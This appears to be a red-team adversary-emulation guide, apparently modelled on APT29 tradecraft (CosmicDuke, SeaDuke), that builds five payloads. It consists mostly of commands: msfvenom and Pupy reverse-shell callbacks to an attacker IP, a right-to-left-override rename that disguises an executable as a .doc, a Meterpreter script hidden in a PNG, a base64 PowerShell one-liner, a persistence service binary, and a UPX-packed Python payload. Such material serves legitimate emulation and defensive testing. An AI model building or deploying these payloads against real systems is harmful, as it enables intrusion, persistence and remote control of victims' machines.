### Create Day 1 Payloads


#### 1. CosmicDuke Payload (cod.3aka3.scr)

| Filename | Location | Description |
| ------ | ------ | ------ |
| cod.3aka3.scr | payloads/cod.3aka3.scr | Portable executable that uses right-to-left override character to disguise file extension |


1. Generate a Pupy-EC4 callback payload:

```
gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234
```

2. On Windows attack platform, rename cod.3aka3.scr with right-to-left override character (https://redcanary.com/blog/right-to-left-override/)
  
    1. Windows key and type 'Character Map'; select open
    2. Scroll to the RTLO character (U+202E)
    3. Select the RTLO character, then click "select", then click "copy"
    4. Right click `cod.3aka3.scr`, then click "Rename"
    5. Move cursor to beginning of filename. Press "ctrl-v" to paste RTLO character, and hit "enter" to save the rename.
    6. The file should now be named "rcs.3aka3.doc"

![alt text](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/041515_2317_SpoofUsingR1.png)

Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/


#### 2. Privilege Escalation Payload (monkey.png)

| Filename | Location | Description |
| ------ | ------ | ------ |
| monkey.png | payloads/monkey.png | Well formed PNG with embedded PowerShell-Meterpreter callback |

Steps to re-create:
1. Generate a PowerShell-formatted Meterpreter payload:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1
```

2. Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage (https://github.com/peewpw/Invoke-PSImage):

```
Import-Module .\Invoke-PSImage.ps1
```

```
Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg
```

#### 3. Startup Folder Payload (strings64/hostui.exe)

| Filename | Location | Description |
| ------ | ------ | ------ |
| strings64.exe | payloads/SysinternalsSuite/strings64.exe | Launches Meterpreter using CreateProcessWithToken API call 
1. Generate PowerShell-formatted Meterpreter:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh-cmd
```

2. Copy the PowerShell 1-liner to clipboard. Your clipboard should look like: 

`powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa=`

Do **not** copy the execution preamble (`%COMSPEC% /b /c start /b /min`)

3. Open `payloads/readme.txt`; paste the PowerShell-Meterpreter blog on line `816`. This line should look like:

`$javasvc = "powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa="`

#### 4. Persistent Service Payload (javamtsup.exe)

| Filename | Location | Description |
| ------ | ------ | ------ |
| javamtsup.exe | payloads/SysinternalsSuite/javamtsup.exe | Reverse HTTPS Meterpreter service executable |

1. Generate a Meterpreter service-binary:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe
```

#### 5. SeaDuke Payload (python.exe)

| Filename | Location | Description |
| ------ | ------ | ------ |
| python.exe | payloads/Seaduke/python.exe | Python Meterpreter compiled to EXE with PyInstaller |

1. Generate python-formatted Meterpreter:

```
msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py
```

2. Transfer python.py to Windows attack platform

3. Compile python.py into a portable executable using PyInstaller (https://pypi.org/project/PyInstaller/)

```
pyinstaller -F python.py
```

4. Pack the python.exe payload using UPX (https://github.com/upx/upx)

```
upx --brute python.exe
```
